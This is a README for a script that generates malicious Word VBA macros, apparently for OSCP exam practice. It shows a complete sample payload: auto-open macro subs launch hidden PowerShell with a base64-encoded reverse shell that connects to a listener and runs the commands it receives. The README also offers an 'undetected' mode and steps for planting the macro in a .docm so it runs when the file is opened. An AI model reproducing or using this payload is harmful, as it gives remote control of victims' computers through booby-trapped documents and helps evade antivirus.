# vba_generator
#### A simple script for generating a reverse shell VBA macro, intended for the OSCP exam.

## Usage

```
For undetected reverse shell:
USAGE: macro_generator.py IP PORT --undetected

For easily detecte reverse shell but suitable for machines:
USAGE: macro_generator.py IP PORT

Output for example:

-----START OF THE PAYLOAD-----

Sub AutoOpen()
       AutoOpenMacro
End Sub

Sub Document_Open()
       AutoOpenMacro
End Sub

Sub AutoOpenMacro()
      Dim Str As String

    Str = str+"powershell.exe -nop -w hidden -e UwB0AGEAcgB0AC0AU"
    Str = str+"AByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwB"
    Str = str+"lAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlA"
    Str = str+"G4AdABMAGkAcwB0ACAAewAtAGUAcAAgAGIAeQBwAGEAcwBzACA"
    Str = str+"ALQBuAG8AcAAgACQAZQBSAG4AbwBnAEwAaQAyAEQAaAAgAD0AI"
    Str = str+"ABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgB"
    Str = str+"OAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlA"
    Str = str+"G4AdAAoACcAMAB4AGMAMABhADgANAA5ADgAMAAnACwAMAB4ADE"
    Str = str+"AYgBiACkAOwAkAFQAbQBOAHcAegBSAFMAQwBSADIAIAA9ACAAJ"
    Str = str+"ABlAFIAbgBvAGcATABpADIARABoAC4ARwBlAHQAUwB0AHIAZQB"
    Str = str+"hAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAMAB0AFoAUwBLA"
    Str = str+"FEAdgA2AEkAUQAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHs"
    Str = str+"AMAB9ADsAdwBoAGkAbABlACgAKAAkAEIAcABEAHoAVQBDAHcAa"
    Str = str+"wBlAHcAIAA9ACAAJABUAG0ATgB3AHoAUgBTAEMAUgAyAC4AUgB"
    Str = str+"lAGEAZAAoACQAMAB0AFoAUwBLAFEAdgA2AEkAUQAsACAAMAAsA"
    Str = str+"CAAJAAwAHQAWgBTAEsAUQB2ADYASQBRAC4ATABlAG4AZwB0AGg"
    Str = str+"AKQApACAALQBuAGUAIAAwACkAewA7ACQAUwB4AFQATwBaAGwAc"
    Str = str+"QB4AHgAZgAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA"
    Str = str+"tAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlA"
    Str = str+"HgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEc"
    Str = str+"AZQB0AFMAdAByAGkAbgBnACgAJAAwAHQAWgBTAEsAUQB2ADYAS"
    Str = str+"QBRACwAMAAsACAAJABCAHAARAB6AFUAQwB3AGsAZQB3ACkAOwA"
    Str = str+"kAHIAUgBWAEoARQBnAE0ASwB3ADIAIAA9ACAAKABpACcAJwBlA"
    Str = str+"HgAIAAkAFMAeABUAE8AWgBsAHEAeAB4AGYAIAAyAD4AJgAxACA"
    Str = str+"AfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABkAEwAS"
    Str = str+"gBVAFYAQQBtAEQAUABDACAAPQAgACQAcgBSAFYASgBFAGcATQB"
    Str = str+"LAHcAMgAgACsAIAAnADwAOgBnAEcASwBlAGQASwBCAGEAUwAwA"
    Str = str+"DoAPgAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACs"
    Str = str+"AIAAnAD4AIAAnADsAJABZADkARQAyAHYANgBSAGoARgBhACAAP"
    Str = str+"QAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA"
    Str = str+"6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABkA"
    Str = str+"EwASgBVAFYAQQBtAEQAUABDACkAOwAkAFQAbQBOAHcAegBSAFM"
    Str = str+"AQwBSADIALgBXAHIAaQB0AGUAKAAkAFkAOQBFADIAdgA2AFIAa"
    Str = str+"gBGAGEALAAwACwAJABZADkARQAyAHYANgBSAGoARgBhAC4ATAB"
    Str = str+"lAG4AZwB0AGgAKQA7ACQAVABtAE4AdwB6AFIAUwBDAFIAMgAuA"
    Str = str+"EYAbAB1AHMAaAAoACkAfQA7ACQAZQBSAG4AbwBnAEwAaQAyAEQ"
    Str = str+"AaAAuAEMAbABvAHMAZQAoACkAfQAgAC0AVwBpAG4AZABvAHcAU"
    Str = str+"wB0AHkAbABlACAASABpAGQAZABlAG4A"

    CreateObject("Wscript.shell").Run Str
End Sub

-----END OF THE PAYLOAD-----

Instructions:
Create a Word document and save it as Word 97-2003 .docm.
Then, go to "View", "Macro", and create a macro named AutoOpenMacro, copy the macro script above and save it in the document itself!
Finally, save the file, open a listener and wait for a reverse shell when the document opens.

Macro saved to rev_shell.macro as well.
```
